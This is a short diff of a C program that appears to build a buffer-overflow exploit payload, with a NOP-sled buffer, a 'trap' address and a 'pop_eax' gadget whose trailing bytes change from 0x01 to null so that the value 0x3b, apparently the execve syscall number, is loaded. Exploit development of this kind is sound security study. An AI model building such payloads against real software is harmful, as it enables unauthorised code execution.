@@ -9,7 +9,7 @@ int main(void)
 {
   char bufr[140];
   char trap[] = "\xe5\xb6\xa9\xbb";
-  char pop_eax[] = "\xe1\xa0\xb9\xbb\x01\x01\x01\x3b";
+  char pop_eax[] = "\xe1\xa0\xb9\xbb\x3b\x00\x00\x00";
   int i;
   for(i = 0; i < 131; i++)
     memcpy(bufr + i, "\x90",1);
